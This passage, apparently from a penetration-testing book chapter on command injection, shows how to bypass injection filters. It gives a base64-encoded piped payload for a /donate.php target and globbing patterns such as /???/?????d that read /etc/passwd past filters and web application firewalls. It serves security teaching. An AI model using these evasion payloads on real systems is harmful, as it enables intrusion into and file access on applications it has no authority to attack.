<p class="TX">Finally, to display the correct output from the command, we run a <span class="SANS_TheSansMonoCd_W5Regular_11">diff</span> operation to extract the difference between the <span class="SANS_TheSansMonoCd_W5Regular_11">prev_resp</span> and the <span class="SANS_TheSansMonoCd_W5Regular_11">new_resp</span> variables <span class="CodeAnnotation" aria-label="annotation4">❹</span>. The <span class="SANS_TheSansMonoCd_W5Regular_11">diff</span> output is stored in a <span class="SANS_TheSansMonoCd_W5Regular_11">delta</span> variable, which showcases all the new <i>amount_to_donate.txt</i> file lines that were created after our injection.</p>&#13;
<p class="TX">Try extending this script to make it more useful. For example, you could add support for viewing all commands that have been executed, along with their responses, by writing them to a file, then presenting them during the script’s runtime when a special command is used.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec18">&#13;
<h2 class="H1" id="sec18"><span id="h1-46"/><span class="SANS_Futura_Std_Bold_B_11">Bypassing Command Injection Restrictions</span></h2>&#13;
<p class="TNI1">As we observed, developers often implement sanitization checks to prevent OS command injection attacks against their web applications. We got lucky, as the pipe (<span class="SANS_TheSansMonoCd_W5Regular_11">|</span>) character wasn’t blocked in our target. Even so, it’s important to understand a few methods you could use to bypass command injection controls.</p>&#13;
<section epub:type="division" aria-labelledby="sec19">&#13;
<h3 class="H2" id="sec19"><span id="h2-92"/><span class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Obfuscation and Encoding</span></h3>&#13;
<p class="TNI1">When we sent commands to a web shell earlier in this chapter, URL encoding requirements posed a challenge we needed to overcome. However, encoding and obfuscation may actually help us evade detection in some cases. Techniques like URL encoding, base64 encoding, and character encoding can hide the payload from security controls, checks, and filters.</p>&#13;
<p class="TX">For example, we could base64-encode an entire command, such as <span class="SANS_TheSansMonoCd_W5Regular_11">ls -l</span>, and hide it in the input. Test this encoding by sending the following payload to <i>/donate.php</i>:</p>&#13;
<pre><code>|<b> $(echo 'bHMgLWw=' | base64 -d)</b></code></pre>&#13;
<p class="TX"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_140" aria-label="140"/>You should receive a full filesystem listing of the web application’s present working directory.</p>&#13;
<p class="TX">This technique aims to evade simple pattern-matching or filtering mechanisms used for detection. Basic techniques such as the use of regular expressions will have trouble identifying bash commands in the encoded <span class="SANS_TheSansMonoCd_W5Regular_11">bHMgLWw=</span> string.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec20">&#13;
<h3 class="H2" id="sec20"><span id="h2-93"/><span class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Globbing</span></h3>&#13;
<p class="TNI1"><i>Globbing</i> is the process of using wildcard patterns to partially or fully match filenames or other content in files. A string is considered a wildcard pattern if it contains characters such as <span class="SANS_TheSansMonoCd_W5Regular_11">?</span>, <span class="SANS_TheSansMonoCd_W5Regular_11">*</span>, [,], or <span class="SANS_TheSansMonoCd_W5Regular_11">!</span>.</p>&#13;
<p class="TX">Globbing is interesting because it allows us to specify patterns that expand to specific filenames or directories without actually providing the exact name, potentially bypassing accessing restrictions. Consider the <i>/etc/passwd</i> file on Linux. To view it, we could use <span class="SANS_TheSansMonoCd_W5Regular_11">ls</span>, followed by the specific path and filename:</p>&#13;
<pre><code>$ <b>ls -l /etc/passwd</b>&#13;
&#13;
-rw-r--r-- 1 root root 3262 Jul 22 23:15 /etc/passwd&#13;
</code></pre>&#13;
<p class="TX">But we could also run a command such as this one to list the file by using the <span class="SANS_TheSansMonoCd_W5Regular_11">?</span> wildcard character:</p>&#13;
<pre><code>$ <b>ls -l /etc/p?sswd</b>&#13;
&#13;
-rw-r--r-- 1 root root 3262 Jul 22 23:15 /etc/passwd&#13;
</code></pre>&#13;
<p class="TX">Bash will try to match this pattern to files under the <i>/etc</i> directory. Since <i>passwd</i> is the only file with a name pattern that is similar, the <i>?</i> character will expand to <i>a</i>, which matches <i>passwd</i>.</p>&#13;
<p class="TX">We can use the same approach to access potentially restricted directories:</p>&#13;
<pre><code>$ <b>ls -l /e??/passwd</b>&#13;
&#13;
-rw-r--r-- 1 root root 3262 Jul 22 23:15 /etc/passwd&#13;
</code></pre>&#13;
<p class="TX">Because no other directory names are three characters long and start with <i>e</i> at the root of the filesystem (<i>/</i>), the pattern will match the <i>/etc</i> directory.</p>&#13;
<p class="TX">Globbing can get more extreme. How about filling in all characters with question marks except the last character? This, too, would match <i>/etc/passwd</i> if no similar filenames exist in the directory:</p>&#13;
<pre><code>$ <b>ls -l /???/?????d</b>&#13;
&#13;
-rw-r--r-- 1 root root 3262 Jul 22 23:15 /etc/passwd&#13;
</code></pre>&#13;
<p class="TX">We can combine globbing with brace expansion to match more than one pattern under <i>/etc</i>. In the following example, bash will search for files <span role="doc-pagebreak" epub:type="pagebreak" id="pg_141" aria-label="141"/>that start with <i>p</i> and end with <i>d</i>, as well as files that start with <i>g</i> and end with <i>p</i>. This should match files such as <i>/etc/passwd</i> and <i>/etc/group</i>:</p>&#13;
<pre><code>$ <b>ls /??c/{p????d,g???p}</b>&#13;
&#13;
-rw-r--r-- 1 root root 3262 Jul 22 23:15 /etc/passwd&#13;
</code></pre>&#13;
<p class="TX">Familiarizing yourself with features like globbing is helpful because you may run into applications (or even web application firewalls) that restrict the use of certain characters in input without taking into consideration globbing, allowing us to bypass filters and validations.</p>&#13;
<p class="TX">For example, web application firewalls commonly block requests to URLs containing parameters such as <i>http://example.com?file=/etc/passwd</i>. Depending on how the application uses the filename, globbing may help bypass the firewall’s detection logic.</p>&#13;
</section>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec21">&#13;
<h2 class="H1" id="sec21"><span id="h1-47"/><span class="SANS_Futura_Std_Bold_B_11">Summary</span></h2>&#13;
<p class="TNI1">As you’ve seen in previous chapters, the power of the bash shell is undeniable, making popping a shell an exciting prospect. These shells open up possibilities for further exploitation and lateral movement on the target system.</p>&#13;
<p class="TX">In this chapter, we gained low-privileged footholds into targeted systems by deploying web shells and injecting OS commands. We also used bash to craft accessible interfaces to these vulnerabilities and explored ways of obfuscating bash commands through strategies like globbing. In the next chapter, we’ll explore a few more techniques for establishing remote shells across different environments.</p>&#13;
</section>&#13;
</section>&#13;
</body></html>